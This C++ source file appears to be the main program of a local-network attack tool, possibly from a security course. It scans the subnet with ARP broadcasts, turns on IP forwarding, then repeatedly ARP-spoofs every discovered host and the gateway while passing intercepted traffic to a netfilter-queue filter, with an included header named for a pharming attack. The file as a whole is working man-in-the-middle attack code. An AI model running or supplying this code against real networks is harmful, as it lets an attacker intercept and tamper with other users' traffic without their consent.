#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <cerrno>
#include <cstdlib>
#include <unistd.h>
#include <map>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>

#include <linux/if_packet.h>

#include <linux/netfilter.h>		
#include <libnetfilter_queue/libnetfilter_queue.h>

#include "arp.h"
#include "scan.h"
#include "spoof.h"
#include "filter.h"
#include "pharm_attack.h"

/**
 * target all the neighbors in the local network
 * @param gateway_ip the ip address of gateway in std::string
 * @param answered_list the list of all the hosts in the local area network
 * @param spoof_operator the spoof operator
 * @param filter_operator the filter operator
 */
void arp_spoofing(std::string gateway_ip, 
        std::vector<std::pair<std::string, std::string>> answered_list,
        SpoofOperator *spoof_operator, FilterOperator *filter_operator)
{
    // run for 100 iterations
    int nbytes;
    filter_operator->set_timeout(1, 0);

    for (int t = 0; t < 100; t++) {
        std::cout << "spoofing iteration: " << t << std::endl;
        for (auto i = 0; i < answered_list.size(); i++) {
            if (answered_list[i].first != gateway_ip) {
                spoof_operator->attack(answered_list[i].first, gateway_ip);
                spoof_operator->attack(gateway_ip, answered_list[i].first);
            }
        }
        while (true) {
            nbytes = filter_operator->receive();
            if (nbytes < 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    // timeout
                    break;
                } else {
                    perror("filter_operator->recv() failed");
                    exit(EXIT_FAILURE);
                }
            } else {
                filter_operator->handle_packet(nbytes);
            }
        }
        // process data
        sleep(2);
    }
}

int main()
{
    std::string sender_mac, target_mac;
    std::string sender_ip, target_ip, netmask, ifname;
    std::string gateway_ip;
    
    // iterate through all network interfaces
    // stops if ifname != "lo"
    get_network_interface_info(sender_ip, netmask, sender_mac, ifname);
    gateway_ip = get_gateway(ifname);

    std::vector<std::string> candidates;
    std::vector<std::pair<std::string, std::string>> answered_list;
    std::map<std::string, std::string> ip2mac_map;

    // use ip and netmask to calculate all possible neighbors
    get_host_in_range(sender_ip, netmask, candidates);

    // initiation of self defined arp operator
    // used to initialize & send & recv arp packets
    ARPOperator arp_operator(sender_ip, ifname);

    // initialize broadcast for neighbor discovery
    target_mac = "00:00:00:00:00:00";

    arp_operator.prepare_broadcast();
    arp_operator.prepare_header_values();
    for (auto candidate : candidates) {
        arp_operator.set_target(candidate, target_mac);
        arp_operator.send();
    }

    // set timeout
    // don't know how to set the actual timeout window
    arp_operator.clear_buffer();
    arp_operator.set_timeout(2, 0);
    int nbytes;
    std::string host_ip, host_mac;

    // print the banner
    std::cout << "Available devices" << std::endl;
    std::cout << "---------------------------------" << std::endl;
    std::cout << "IP\t\tMAC\t\t" << std::endl;
    std::cout << "---------------------------------" << std::endl;

    // recv packets continuously until timeout
    while (true) {
        nbytes = arp_operator.recv();
        if (nbytes < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // timeout
                break;
            } else {
                perror("arp_operator.recv() failed");
                exit(EXIT_FAILURE);
            }
        } else if (arp_operator.get_candidate_response(host_ip, host_mac)) {
            std::cout << host_ip << "\t" << host_mac << std::endl;
            answered_list.push_back(std::make_pair(host_ip, host_mac));
            ip2mac_map[host_ip] = host_mac;
        }
    }

    arp_operator.clear_buffer();

    // choose the first target that is not the gateway
    std::map<std::string, std::string>::iterator it;
    for (it = ip2mac_map.begin(); it != ip2mac_map.end(); it++) {
        if (it->first != gateway_ip) {
            target_ip = it->first;
            target_mac = it->second;
        }
    }

    // initialize the spoof operator
    SpoofOperator spoof_operator(&arp_operator, gateway_ip, &ip2mac_map);

    if (set_ip_forwarding(1) < 0) {
        exit(EXIT_FAILURE);
    }

    FilterOperator filter_operator;

    arp_operator.prepare_unicast();
    arp_operator.prepare_header_values();

    arp_spoofing(gateway_ip, answered_list, &spoof_operator, &filter_operator);

    return 0;
}
